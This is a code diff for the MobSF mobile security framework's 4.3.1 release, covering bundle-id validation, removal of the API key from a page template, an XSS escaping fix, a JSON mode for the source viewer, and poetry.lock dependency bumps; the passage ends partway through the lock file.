mobsf/DynamicAnalyzer/views/ios/report.py:\n```\n@@ -49,8 +49,9 @@\ndef ios_view_report(request, bundle_id, api=False):\n         else:\n             dev = ''\n         if not strict_package_check(bundle_id):\n-            # We need this check since bundleid\n-            # is not validated in REST API\n+            # bundle_id is not validated in REST API.\n+            # Also bundleid is not strictly validated\n+            # in URL path.\n             return print_n_send_error_response(\n                 request,\n                 'Invalid iOS Bundle id',\n```\n\nFilename: mobsf/MobSF/init.py:\n```\n@@ -18,7 +18,7 @@\nlogger = logging.getLogger(__name__)\n \n-VERSION = '4.3.0'\n+VERSION = '4.3.1'\n BANNER = r\"\"\"\n   __  __       _    ____  _____       _  _    _____ \n  |  \\/  | ___ | |__/ ___||  ___|_   _| || |  |___ /\n```\n\nFilename: mobsf/MobSF/urls.py:\n```\n@@ -52,7 +52,7 @@\nfrom . import settings\n \n-bundle_id_regex = r'(?P<bundle_id>([a-zA-Z0-9]{1}[\\w.-]{1,255}))$'\n+bundle_id_regex = r'(?P<bundle_id>.+)$'\n checksum_regex = r'(?P<checksum>[0-9a-f]{32})'\n paginate = r'(?P<page_size>[0-9]{1,10})/(?P<page_number>[0-9]{1,10})'\n```\n\nFilename: mobsf/StaticAnalyzer/views/android/views/source_tree.py:\n```\n@@ -10,7 +10,6 @@\nrender,\n )\n \n-from mobsf.MobSF.init import api_key\n from mobsf.MobSF.utils import (\n     is_md5,\n     print_n_send_error_response,\n\n@@ -71,7 +70,6 @@\ndef run(request):\n             'hash': md5,\n             'source_type': typ,\n             'version': settings.MOBSF_VER,\n-            'api_key': api_key(settings.MOBSF_HOME),\n         }\n         template = 'static_analysis/source_tree.html'\n         return render(request, template, context)\n```\n\nFilename: mobsf/StaticAnalyzer/views/android/views/view_source.py:\n```\n@@ -1,13 +1,13 @@\n# -*- coding: utf_8 -*-\n \"\"\"View Source of a file.\"\"\"\n-\n import logging\n import ntpath\n from pathlib import Path\n \n from django.conf import settings\n from django.shortcuts import render\n from django.utils.html import escape\n+from django.http import JsonResponse\n \n from mobsf.MobSF.forms import FormUtil\n from mobsf.MobSF.utils import (\n\n@@ -28,9 +28,26 @@\nlogger = logging.getLogger(__name__)\n \n \n+def send_json(data):\n+    return JsonResponse(data, safe=False)\n+\n+\n+def send_error(request, err, api_mode, json_resp, exp=None):\n+    \"\"\"Send error message as dict or JSON.\"\"\"\n+    if exp:\n+        res = print_n_send_error_response(request, err, api_mode, exp)\n+    else:\n+        res = print_n_send_error_response(request, err, api_mode)\n+    if json_resp:\n+        return send_json(res)\n+    return res\n+\n+\n @login_required\n def run(request, api=False):\n     \"\"\"View the source of a file.\"\"\"\n+    json_resp = request.GET.get('json', '0') == '1'\n+    api_mode = api or json_resp\n     try:\n         logger.info('View Java Source File')\n         exp = 'Error Description'\n\n@@ -46,8 +63,7 @@\ndef run(request, api=False):\n             viewsource_form = ViewSourceAndroidForm(request.GET)\n         if not viewsource_form.is_valid():\n             err = FormUtil.errors_message(viewsource_form)\n-            return print_n_send_error_response(request, err, api, exp)\n-\n+            return send_error(request, err, api_mode, json_resp, exp)\n         base = Path(settings.UPLD_DIR) / md5\n         if typ == 'smali':\n             src = base / 'smali_source'\n\n@@ -57,12 +73,12 @@\ndef run(request, api=False):\n                 src, syntax, _ = find_java_source_folder(base)\n             except StopIteration:\n                 msg = 'Invalid directory or file extension'\n-                return print_n_send_error_response(request, msg, api)\n+                return send_error(request, msg, api_mode, json_resp)\n \n         sfile = src / fil\n         if not is_safe_path(src, sfile.as_posix()):\n             msg = 'Path Traversal Detected!'\n-            return print_n_send_error_response(request, msg, api)\n+            return send_error(request, msg, api_mode, json_resp)\n         context = {\n             'title': escape(ntpath.basename(fil)),\n             'file': escape(ntpath.basename(fil)),\n\n@@ -72,11 +88,13 @@\ndef run(request, api=False):\n             'version': settings.MOBSF_VER,\n         }\n         template = 'general/view.html'\n-        if api:\n+        if json_resp:\n+            return send_json(context)\n+        if api_mode:\n             return context\n         return render(request, template, context)\n     except Exception as exp:\n         logger.exception('Error Viewing Source')\n         msg = str(exp)\n         exp = exp.__doc__\n-        return print_n_send_error_response(request, msg, api, exp)\n+        return send_error(request, msg, api_mode, json_resp, exp)\n```\n\nFilename: mobsf/templates/dynamic_analysis/ios/dynamic_analysis.html:\n```\n@@ -403,7 +403,7 @@\n<h4 class=\"modal-title\">Create a Corellium iOS VM</h4>\n                                   <td><p>\n                                       <a class=\"btn btn-success disable\" onclick=\"dynamic_loader()\" href=\"${url}\"><i class=\"fab fa-apple\"></i> Start Dynamic Analysis</a> \n                                       <a class=\"btn btn-info ${buttonState}\" href=\"../../ios/view_report/${escapeHtml(bundle)}\"><i class=\"fa fa-mobile\"></i> View Report </a>\n-                                      <a class=\"btn btn-warning\" id=\"${$('#ios_dynamic').val()}\" onclick=\"remove_app(this, '${bundle}')\"><i class=\"fas fa-trash-alt\"></i>  Uninstall</a>\n+                                      <a class=\"btn btn-warning\" id=\"${$('#ios_dynamic').val()}\" onclick=\"remove_app(this, '${escapeHtml(bundle)}')\"><i class=\"fas fa-trash-alt\"></i>  Uninstall</a>\n                                       </p>\n                                   </td></tr>`);\n                         }\n```\n\nFilename: mobsf/templates/static_analysis/source_tree.html:\n```\n@@ -275,17 +275,9 @@\n<h2>\n \n function show_file(strPath) {\n     $.ajax({\n-        type: \"POST\",\n-        url: \"{% url \"api_view_source\" %}\",\n+        type: \"GET\",\n+        url: \"{% url \"view_source\" %}?json=1&md5={{ hash }}&type={{ source_type }}&file=\" + strPath,\n         dataType: 'json',\n-        headers: {\n-            \"Authorization\": \"{{ api_key }}\"\n-        },\n-        data: {\n-            type: \"{{ source_type }}\",\n-            hash: \"{{ hash }}\",\n-            file: strPath\n-        },\n         success: function(strFileData) {\n             var code_block = $(\"pre#fileoutput\")\n             code_block.text(strFileData.data);\n```\n\nFilename: poetry.lock:\n```\n@@ -1,4 +1,4 @@\n-# This file is automatically @generated by Poetry 1.6.1 and should not be changed by hand.\n+# This file is automatically @generated by Poetry 1.8.4 and should not be changed by hand.\n \n [[package]]\n name = \"aioquic\"\n\n@@ -146,13 +146,13 @@\nfiles = [\n \n [[package]]\n name = \"attrs\"\n-version = \"24.3.0\"\n+version = \"25.1.0\"\n description = \"Classes Without Boilerplate\"\n optional = false\n python-versions = \">=3.8\"\n files = [\n-    {file = \"attrs-24.3.0-py3-none-any.whl\", hash = \"sha256:ac96cd038792094f438ad1f6ff80837353805ac950cd2aa0e0625ef19850c308\"},\n-    {file = \"attrs-24.3.0.tar.gz\", hash = \"sha256:8f5c07333d543103541ba7be0e2ce16eeee8130cb0b3f9238ab904ce1e85baff\"},\n+    {file = \"attrs-25.1.0-py3-none-any.whl\", hash = \"sha256:c75a69e28a550a7e93789579c22aa26b0f5b83b75dc4e08fe092980051e1090a\"},\n+    {file = \"attrs-25.1.0.tar.gz\", hash = \"sha256:1c97078a80c814273a76b2a298a932eb681c87415c11dee0a6921de7f1b02c3e\"},\n ]\n \n [package.extras]\n\n@@ -199,17 +199,18 @@\ntypecheck = [\"mypy\"]\n \n [[package]]\n name = \"beautifulsoup4\"\n-version = \"4.12.3\"\n+version = \"4.13.3\"\n description = \"Screen-scraping library\"\n optional = false\n-python-versions = \">=3.6.0\"\n+python-versions = \">=3.7.0\"\n files = [\n-    {file = \"beautifulsoup4-4.12.3-py3-none-any.whl\", hash = \"sha256:b80878c9f40111313e55da8ba20bdba06d8fa3969fc68304167741bbf9e082ed\"},\n-    {file = \"beautifulsoup4-4.12.3.tar.gz\", hash = \"sha256:74e3d1928edc070d21748185c46e3fb33490f22f52a3addee9aee0f4f7781051\"},\n+    {file = \"beautifulsoup4-4.13.3-py3-none-any.whl\", hash = \"sha256:99045d7d3f08f91f0d656bc9b7efbae189426cd913d830294a15eefa0ea4df16\"},\n+    {file = \"beautifulsoup4-4.13.3.tar.gz\", hash = \"sha256:1bd32405dacc920b42b83ba01644747ed77456a65760e285fbc47633ceddaf8b\"},\n ]\n \n [package.dependencies]\n soupsieve = \">1.2\"\n+typing-extensions = \">=4.0.0\"\n \n [package.extras]\n cchardet = [\"cchardet\"]\n\n@@ -257,6 +258,10 @@\nfiles = [\n     {file = \"Brotli-1.1.0-cp310-cp310-musllinux_1_1_i686.whl\", hash = \"sha256:a37b8f0391212d29b3a91a799c8e4a2855e0576911cdfb2515487e30e322253d\"},\n     {file = \"Brotli-1.1.0-cp310-cp310-musllinux_1_1_ppc64le.whl\", hash = \"sha256:e84799f09591700a4154154cab9787452925578841a94321d5ee8fb9a9a328f0\"},\n     {file = \"Brotli-1.1.0-cp310-cp310-musllinux_1_1_x86_64.whl\", hash = \"sha256:f66b5337fa213f1da0d9000bc8dc0cb5b896b726eefd9c6046f699b169c41b9e\"},\n+    {file = \"Brotli-1.1.0-cp310-cp310-musllinux_1_2_aarch64.whl\", hash = \"sha256:5dab0844f2cf82be357a0eb11a9087f70c5430b2c241493fc122bb6f2bb0917c\"},\n+    {file = \"Brotli-1.1.0-cp310-cp310-musllinux_1_2_i686.whl\", hash = \"sha256:e4fe605b917c70283db7dfe5ada75e04561479075761a0b3866c081d035b01c1\"},\n+    {file = \"Brotli-1.1.0-cp310-cp310-musllinux_1_2_ppc64le.whl\", hash = \"sha256:1e9a65b5736232e7a7f91ff3d02277f11d339bf34099a56cdab6a8b3410a02b2\"},\n+    {file = \"Brotli-1.1.0-cp310-cp310-musllinux_1_2_x86_64.whl\", hash = \"sha256:58d4b711689366d4a03ac7957ab8c28890415e267f9b6589969e74b6e42225ec\"},\n     {file = \"Brotli-1.1.0-cp310-cp310-win32.whl\", hash = \"sha256:be36e3d172dc816333f33520154d708a2657ea63762ec16b62ece02ab5e4daf2\"},\n     {file = \"Brotli-1.1.0-cp310-cp310-win_amd64.whl\", hash = \"sha256:0c6244521dda65ea562d5a69b9a26120769b7a9fb3db2fe9545935ed6735b128\"},\n     {file = \"Brotli-1.1.0-cp311-cp311-macosx_10_9_universal2.whl\", hash = \"sha256:a3daabb76a78f829cafc365531c972016e4aa8d5b4bf60660ad8ecee19df7ccc\"},\n\n@@ -269,8 +274,14 @@\nfiles = [\n     {file = \"Brotli-1.1.0-cp311-cp311-musllinux_1_1_i686.whl\", hash = \"sha256:19c116e796420b0cee3da1ccec3b764ed2952ccfcc298b55a10e5610ad7885f9\"},\n     {file = \"Brotli-1.1.0-cp311-cp311-musllinux_1_1_ppc64le.whl\", hash = \"sha256:510b5b1bfbe20e1a7b3baf5fed9e9451873559a976c1a78eebaa3b86c57b4265\"},\n     {file = \"Brotli-1.1.0-cp311-cp311-musllinux_1_1_x86_64.whl\", hash = \"sha256:a1fd8a29719ccce974d523580987b7f8229aeace506952fa9ce1d53a033873c8\"},\n+    {file = \"Brotli-1.1.0-cp311-cp311-musllinux_1_2_aarch64.whl\", hash = \"sha256:c247dd99d39e0338a604f8c2b3bc7061d5c2e9e2ac7ba9cc1be5a69cb6cd832f\"},\n+    {file = \"Brotli-1.1.0-cp311-cp311-musllinux_1_2_i686.whl\", hash = \"sha256:1b2c248cd517c222d89e74669a4adfa5577e06ab68771a529060cf5a156e9757\"},\n+    {file = \"Brotli-1.1.0-cp311-cp311-musllinux_1_2_ppc64le.whl\", hash = \"sha256:2a24c50840d89ded6c9a8fdc7b6ed3692ed4e86f1c4a4a938e1e92def92933e0\"},\n+    {file = \"Brotli-1.1.0-cp311-cp311-musllinux_1_2_x86_64.whl\", hash = \"sha256:f31859074d57b4639318523d6ffdca586ace54271a73ad23ad021acd807eb14b\"},\n     {file = \"Brotli-1.1.0-cp311-cp311-win32.whl\", hash = \"sha256:39da8adedf6942d76dc3e46653e52df937a3c4d6d18fdc94a7c29d263b1f5b50\"},\n     {file = \"Brotli-1.1.0-cp311-cp311-win_amd64.whl\", hash = \"sha256:aac0411d20e345dc0920bdec5548e438e999ff68d77564d5e9463a7ca9d3e7b1\"},\n+    {file = \"Brotli-1.1.0-cp312-cp312-macosx_10_13_universal2.whl\", hash = \"sha256:32d95b80260d79926f5fab3c41701dbb818fde1c9da590e77e571eefd14abe28\"},\n+    {file = \"Brotli-1.1.0-cp312-cp312-macosx_10_13_x86_64.whl\", hash = \"sha256:b760c65308ff1e462f65d69c12e4ae085cff3b332d894637f6273a12a482d09f\"},\n     {file = \"Brotli-1.1.0-cp312-cp312-macosx_10_9_universal2.whl\", hash = \"sha256:316cc9b17edf613ac76b1f1f305d2a748f1b976b033b049a6ecdfd5612c70409\"},\n     {file = \"Brotli-1.1.0-cp312-cp312-macosx_10_9_x86_64.whl\", hash = \"sha256:caf9ee9a5775f3111642d33b86237b05808dafcd6268faa492250e9b78046eb2\"},\n     {file = \"Brotli-1.1.0-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\", hash = \"sha256:70051525001750221daa10907c77830bc889cb6d865cc0b813d9db7fefc21451\"},\n\n@@ -281,8 +292,24 @@\nfiles = [\n     {file = \"Brotli-1.1.0-cp312-cp312-musllinux_1_1_i686.whl\", hash = \"sha256:4093c631e96fdd49e0377a9c167bfd75b6d0bad2ace734c6eb20b348bc3ea180\"},\n     {file = \"Brotli-1.1.0-cp312-cp312-musllinux_1_1_ppc64le.whl\", hash = \"sha256:7e4c4629ddad63006efa0ef968c8e4751c5868ff0b1c5c40f76524e894c50248\"},\n     {file = \"Brotli-1.1.0-cp312-cp312-musllinux_1_1_x86_64.whl\", hash = \"sha256:861bf317735688269936f755fa136a99d1ed526883859f86e41a5d43c61d8966\"},\n+    {file = \"Brotli-1.1.0-cp312-cp312-musllinux_1_2_aarch64.whl\", hash = \"sha256:87a3044c3a35055527ac75e419dfa9f4f3667a1e887ee80360589eb8c90aabb9\"},\n+    {file = \"Brotli-1.1.0-cp312-cp312-musllinux_1_2_i686.whl\", hash = \"sha256:c5529b34c1c9d937168297f2c1fde7ebe9ebdd5e121297ff9c043bdb2ae3d6fb\"},\n+    {file = \"Brotli-1.1.0-cp312-cp312-musllinux_1_2_ppc64le.whl\", hash = \"sha256:ca63e1890ede90b2e4454f9a65135a4d387a4585ff8282bb72964fab893f2111\"},\n+    {file = \"Brotli-1.1.0-cp312-cp312-musllinux_1_2_x86_64.whl\", hash = \"sha256:e79e6520141d792237c70bcd7a3b122d00f2613769ae0cb61c52e89fd3443839\"},\n     {file = \"Brotli-1.1.0-cp312-cp312-win32.whl\", hash = \"sha256:5f4d5ea15c9382135076d2fb28dde923352fe02951e66935a9efaac8f10e81b0\"},\n     {file = \"Brotli-1.1.0-cp312-cp312-win_amd64.whl\", hash = \"sha256:906bc3a79de8c4ae5b86d3d75a8b77e44404b0f4261714306e3ad248d8ab0951\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-macosx_10_13_universal2.whl\", hash = \"sha256:8bf32b98b75c13ec7cf774164172683d6e7891088f6316e54425fde1efc276d5\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-macosx_10_13_x86_64.whl\", hash = \"sha256:7bc37c4d6b87fb1017ea28c9508b36bbcb0c3d18b4260fcdf08b200c74a6aee8\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\", hash = \"sha256:3c0ef38c7a7014ffac184db9e04debe495d317cc9c6fb10071f7fefd93100a4f\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl\", hash = \"sha256:91d7cc2a76b5567591d12c01f019dd7afce6ba8cba6571187e21e2fc418ae648\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\", hash = \"sha256:a93dde851926f4f2678e704fadeb39e16c35d8baebd5252c9fd94ce8ce68c4a0\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl\", hash = \"sha256:f0db75f47be8b8abc8d9e31bc7aad0547ca26f24a54e6fd10231d623f183d089\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-musllinux_1_2_aarch64.whl\", hash = \"sha256:6967ced6730aed543b8673008b5a391c3b1076d834ca438bbd70635c73775368\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-musllinux_1_2_i686.whl\", hash = \"sha256:7eedaa5d036d9336c95915035fb57422054014ebdeb6f3b42eac809928e40d0c\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-musllinux_1_2_ppc64le.whl\", hash = \"sha256:d487f5432bf35b60ed625d7e1b448e2dc855422e87469e3f450aa5552b0eb284\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-musllinux_1_2_x86_64.whl\", hash = \"sha256:832436e59afb93e1836081a20f324cb185836c617659b07b129141a8426973c7\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-win32.whl\", hash = \"sha256:43395e90523f9c23a3d5bdf004733246fba087f2948f87ab28015f12359ca6a0\"},\n+    {file = \"Brotli-1.1.0-cp313-cp313-win_amd64.whl\", hash = \"sha256:9011560a466d2eb3f5a6e4929cf4a09be405c64154e12df0dd72713f6500e32b\"},\n     {file = \"Brotli-1.1.0-cp36-cp36m-macosx_10_9_x86_64.whl\", hash = \"sha256:a090ca607cbb6a34b0391776f0cb48062081f5f60ddcce5d11838e67a01928d1\"},\n     {file = \"Brotli-1.1.0-cp36-cp36m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\", hash = \"sha256:2de9d02f5bda03d27ede52e8cfe7b865b066fa49258cbab568720aa5be80a47d\"},\n     {file = \"Brotli-1.1.0-cp36-cp36m-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl\", hash = \"sha256:2333e30a5e00fe0fe55903c8832e08ee9c3b1382aacf4db26664a16528d51b4b\"},\n\n@@ -292,6 +319,10 @@\nfiles = [\n     {file = \"Brotli-1.1.0-cp36-cp36m-musllinux_1_1_i686.whl\", hash = \"sha256:fd5f17ff8f14003595ab414e45fce13d073e0762394f957182e69035c9f3d7c2\"},\n     {file = \"Brotli-1.1.0-cp36-cp36m-musllinux_1_1_ppc64le.whl\", hash = \"sha256:069a121ac97412d1fe506da790b3e69f52254b9df4eb665cd42460c837193354\"},\n     {file = \"Brotli-1.1.0-cp36-cp36m-musllinux_1_1_x86_64.whl\", hash = \"sha256:e93dfc1a1165e385cc8239fab7c036fb2cd8093728cbd85097b284d7b99249a2\"},\n+    {file = \"Brotli-1.1.0-cp36-cp36m-musllinux_1_2_aarch64.whl\", hash = \"sha256:aea440a510e14e818e67bfc4027880e2fb500c2ccb20ab21c7a7c8b5b4703d75\"},\n+    {file = \"Brotli-1.1.0-cp36-cp36m-musllinux_1_2_i686.whl\", hash = \"sha256:6974f52a02321b36847cd19d1b8e381bf39939c21efd6ee2fc13a28b0d99348c\"},\n+    {file = \"Brotli-1.1.0-cp36-cp36m-musllinux_1_2_ppc64le.whl\", hash = \"sha256:a7e53012d2853a07a4a79c00643832161a910674a893d296c9f1259859a289d2\"},\n+    {file = \"Brotli-1.1.0-cp36-cp36m-musllinux_1_2_x86_64.whl\", hash = \"sha256:d7702622a8b40c49bffb46e1e3ba2e81268d5c04a34f460978c6b5517a34dd52\"},\n     {file = \"Brotli-1.1.0-cp36-cp36m-win32.whl\", hash = \"sha256:a599669fd7c47233438a56936988a2478685e74854088ef5293802123b5b2460\"},\n     {file = \"Brotli-1.1.0-cp36-cp36m-win_amd64.whl\", hash = \"sha256:d143fd47fad1db3d7c27a1b1d66162e855b5d50a89666af46e1679c496e8e579\"},\n     {file = \"Brotli-1.1.0-cp37-cp37m-macosx_10_9_x86_64.whl\", hash = \"sha256:11d00ed0a83fa22d29bc6b64ef636c4552ebafcef57154b4ddd132f5638fbd1c\"},\n\n@@ -303,6 +334,10 @@\nfiles = [\n     {file = \"Brotli-1.1.0-cp37-cp37m-musllinux_1_1_i686.whl\", hash = \"sha256:919e32f147ae93a09fe064d77d5ebf4e35502a8df75c29fb05788528e330fe74\"},\n     {file = \"Brotli-1.1.0-cp37-cp37m-musllinux_1_1_ppc64le.whl\", hash = \"sha256:23032ae55523cc7bccb4f6a0bf368cd25ad9bcdcc1990b64a647e7bbcce9cb5b\"},\n     {file = \"Brotli-1.1.0-cp37-cp37m-musllinux_1_1_x86_64.whl\", hash = \"sha256:224e57f6eac61cc449f498cc5f0e1725ba2071a3d4f48d5d9dffba42db196438\"},\n+    {file = \"Brotli-1.1.0-cp37-cp37m-musllinux_1_2_aarch64.whl\", hash = \"sha256:cb1dac1770878ade83f2ccdf7d25e494f05c9165f5246b46a621cc849341dc01\"},\n+    {file = \"Brotli-1.1.0-cp37-cp37m-musllinux_1_2_i686.whl\", hash = \"sha256:3ee8a80d67a4334482d9712b8e83ca6b1d9bc7e351931252ebef5d8f7335a547\"},\n+    {file = \"Brotli-1.1.0-cp37-cp37m-musllinux_1_2_ppc64le.whl\", hash = \"sha256:5e55da2c8724191e5b557f8e18943b1b4839b8efc3ef60d65985bcf6f587dd38\"},\n+    {file = \"Brotli-1.1.0-cp37-cp37m-musllinux_1_2_x86_64.whl\", hash = \"sha256:d342778ef319e1026af243ed0a07c97acf3bad33b9f29e7ae6a1f68fd083e90c\"},\n     {file = \"Brotli-1.1.0-cp37-cp37m-win32.whl\", hash = \"sha256:587ca6d3cef6e4e868102672d3bd9dc9698c309ba56d41c2b9c85bbb903cdb95\"},\n     {file = \"Brotli-1.1.0-cp37-cp37m-win_amd64.whl\", hash = \"sha256:2954c1c23f81c2eaf0b0717d9380bd348578a94161a65b3a2afc62c86467dd68\"},\n     {file = \"Brotli-1.1.0-cp38-cp38-macosx_10_9_universal2.whl\", hash = \"sha256:efa8b278894b14d6da122a72fefcebc28445f2d3f880ac59d46c90f4c13be9a3\"},\n\n@@ -315,6 +350,10 @@\nfiles = [\n     {file = \"Brotli-1.1.0-cp38-cp38-musllinux_1_1_i686.whl\", hash = \"sha256:1ab4fbee0b2d9098c74f3057b2bc055a8bd92ccf02f65944a241b4349229185a\"},\n     {file = \"Brotli-1.1.0-cp38-cp38-musllinux_1_1_ppc64le.whl\", hash = \"sha256:141bd4d93984070e097521ed07e2575b46f817d08f9fa42b16b9b5f27b5ac088\"},\n     {file = \"Brotli-1.1.0-cp38-cp38-musllinux_1_1_x86_64.whl\", hash = \"sha256:fce1473f3ccc4187f75b4690cfc922628aed4d3dd013d047f95a9b3919a86596\"},\n+    {file = \"Brotli-1.1.0-cp38-cp38-musllinux_1_2_aarch64.whl\", hash = \"sha256:d2b35ca2c7f81d173d2fadc2f4f31e88cc5f7a39ae5b6db5513cf3383b0e0ec7\"},\n+    {file = \"Brotli-1.1.0-cp38-cp38-musllinux_1_2_i686.whl\", hash = \"sha256:af6fa6817889314555aede9a919612b23739395ce767fe7fcbea9a80bf140fe5\"},\n+    {file = \"Brotli-1.1.0-cp38-cp38-musllinux_1_2_ppc64le.whl\", hash = \"sha256:2feb1d960f760a575dbc5ab3b1c00504b24caaf6986e2dc2b01c09c87866a943\"},\n+    {file = \"Brotli-1.1.0-cp38-cp38-musllinux_1_2_x86_64.whl\", hash = \"sha256:4410f84b33374409552ac9b6903507cdb31cd30d2501fc5ca13d18f73548444a\"},\n     {file = \"Brotli-1.1.0-cp38-cp38-win32.whl\", hash = \"sha256:db85ecf4e609a48f4b29055f1e144231b90edc90af7481aa731ba2d059226b1b\"},\n     {file = \"Brotli-1.1.0-cp38-cp38-win_amd64.whl\", hash = \"sha256:3d7954194c36e304e1523f55d7042c59dc53ec20dd4e9ea9d151f1b62b4415c0\"},\n     {file = \"Brotli-1.1.0-cp39-cp39-macosx_10_9_universal2.whl\", hash = \"sha256:5fb2ce4b8045c78ebbc7b8f3c15062e435d47e7393cc57c25115cfd49883747a\"},\n\n@@ -327,6 +366,10 @@\nfiles = [\n     {file = \"Brotli-1.1.0-cp39-cp39-musllinux_1_1_i686.whl\", hash = \"sha256:949f3b7c29912693cee0afcf09acd6ebc04c57af949d9bf77d6101ebb61e388c\"},\n     {file = \"Brotli-1.1.0-cp39-cp39-musllinux_1_1_ppc64le.whl\", hash = \"sha256:89f4988c7203739d48c6f806f1e87a1d96e0806d44f0fba61dba81392c9e474d\"},\n     {file = \"Brotli-1.1.0-cp39-cp39-musllinux_1_1_x86_64.whl\", hash = \"sha256:de6551e370ef19f8de1807d0a9aa2cdfdce2e85ce88b122fe9f6b2b076837e59\"},\n+    {file = \"Brotli-1.1.0-cp39-cp39-musllinux_1_2_aarch64.whl\", hash = \"sha256:0737ddb3068957cf1b054899b0883830bb1fec522ec76b1098f9b6e0f02d9419\"},\n+    {file = \"Brotli-1.1.0-cp39-cp39-musllinux_1_2_i686.whl\", hash = \"sha256:4f3607b129417e111e30637af1b56f24f7a49e64763253bbc275c75fa887d4b2\"},\n+    {file = \"Brotli-1.1.0-cp39-cp39-musllinux_1_2_ppc64le.whl\", hash = \"sha256:6c6e0c425f22c1c719c42670d561ad682f7bfeeef918edea971a79ac5252437f\"},\n+    {file = \"Brotli-1.1.0-cp39-cp39-musllinux_1_2_x86_64.whl\", hash = \"sha256:494994f807ba0b92092a163a0a283961369a65f6cbe01e8891132b7a320e61eb\"},\n     {file = \"Brotli-1.1.0-cp39-cp39-win32.whl\", hash = \"sha256:f0d8a7a6b5983c2496e364b969f0e526647a06b075d034f3297dc66f3b360c64\"},\n     {file = \"Brotli-1.1.0-cp39-cp39-win_amd64.whl\", hash = \"sha256:cdad5b9014d83ca68c25d2e9444e28e967ef16e80f6b436918c700c117a85467\"},\n     {file = \"Brotli-1.1.0.tar.gz\", hash = \"sha256:81de08ac11bcb85841e440c13611c00b67d3bf82698314928d0b676362546724\"},\n\n@@ -348,13 +391,13 @@\nbeautifulsoup4 = \"*\"\n \n [[package]]\n name = \"certifi\"\n-version = \"2024.12.14\"\n+version = \"2025.1.31\"\n description = \"Python package for providing Mozilla's CA Bundle.\"\n optional = false\n python-versions = \">=3.6\"\n files = [\n-    {file = \"certifi-2024.12.14-py3-none-any.whl\", hash = \"sha256:1275f7a45be9464efc1173084eaa30f866fe2e47d389406136d332ed4967ec56\"},\n-    {file = \"certifi-2024.12.14.tar.gz\", hash = \"sha256:b650d30f370c2b724812bee08008be0c4163b163ddaec3f2546c1caf65f191db\"},\n+    {file = \"certifi-2025.1.31-py3-none-any.whl\", hash = \"sha256:ca78db4565a652026a4db2bcdf68f2fb589ea80d0be70e03929ed730746b84fe\"},\n+    {file = \"certifi-2025.1.31.tar.gz\", hash = \"sha256:3d5da6925056f6f18f119200434a4780a94263f10d1c21d032a6f6b2baa20651\"},\n ]\n \n [[package]]\n\n@@ -758,24 +801,24 @@\ndotenv = [\"python-dotenv\"]\n \n [[package]]\n name = \"frida\"\n-version = \"16.6.4\"\n+version = \"16.6.6\"\n description = \"Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers\"\n optional = false\n python-versions = \">=3.7\"\n files = [\n-    {file = \"frida-16.6.4-cp37-abi3-macosx_10_13_x86_64.whl\", hash = \"sha256:ef693f38946429d9e133b2318b601e1e3f5acf909524a9b282376796f3a166cb\"},\n-    {file = \"frida-16.6.4-cp37-abi3-macosx_11_0_arm64.whl\", hash = \"sha256:b76377f3afa7f0e2f0702b4b8b3d4e38981fed099c1bab0173f89df2c5c3e15a\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux1_i686.whl\", hash = \"sha256:cdc133dd91f3a3246664a74eaa872fda558df73a2bb23124297610dcaf9cffaf\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux1_x86_64.whl\", hash = \"sha256:5c54f41695a595607cfd136be390a65e4915bf7809cd0a112df3c159de061f8b\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux2014_aarch64.whl\", hash = \"sha256:79739ae860d0f253cfe954568daa0aea41848505a5ffb93d87d0f4ae78e7e731\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux2014_armv7l.whl\", hash = \"sha256:ece306ac4f28923325579d2c4a6a6df793276604dbf1278dd8a8c6391716b49f\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux_2_17_aarch64.whl\", hash = \"sha256:e330101ee6091812bb88b15dfdb8815bd516f3e549f2e683825967960cc08d89\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux_2_17_armv7l.whl\", hash = \"sha256:2f5d929cc501a46be59d93a04aa81d3016bd635e2d6e862ebcb0f77371ac0e4a\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux_2_5_i686.whl\", hash = \"sha256:ba3a4c70acecb19a6317732adefc8b02381ebcf252eb13866f8588ca617da7bc\"},\n-    {file = \"frida-16.6.4-cp37-abi3-manylinux_2_5_x86_64.whl\", hash = \"sha256:70e353bd446c8461c4a6fb5b1d226de6d82b94d4c2bfd8fc719afcc9cdb13981\"},\n-    {file = \"frida-16.6.4-cp37-abi3-win32.whl\", hash = \"sha256:609ddefe4501a3000b7b031fbbf743c0ee84f290e573798041ad0ce3b53c761d\"},\n-    {file = \"frida-16.6.4-cp37-abi3-win_amd64.whl\", hash = \"sha256:325e8bc17f50c148b2611f99ff7ef7da6076009d2c6e18289871140348ab65c7\"},\n-    {file = \"frida-16.6.4.tar.gz\", hash = \"sha256:f991864df5a5e0728a74bece21732f946b917c08f6f8c91fcadb27024834ebc2\"},\n+    {file = \"frida-16.6.6-cp37-abi3-macosx_10_13_x86_64.whl\", hash = \"sha256:b00a2b5f877cbb4955e72413c1f620dc75498a93d4d9a01f663053f2cfb94992\"},\n+    {file = \"frida-16.6.6-cp37-abi3-macosx_11_0_arm64.whl\", hash = \"sha256:dcf59869117f4f6eaa6514555fa0a6499b5efa4e095a5785979b057841037f04\"},\n+    {file = \"frida-16.6.6-cp37-abi3-manylinux1_i686.whl\", hash = 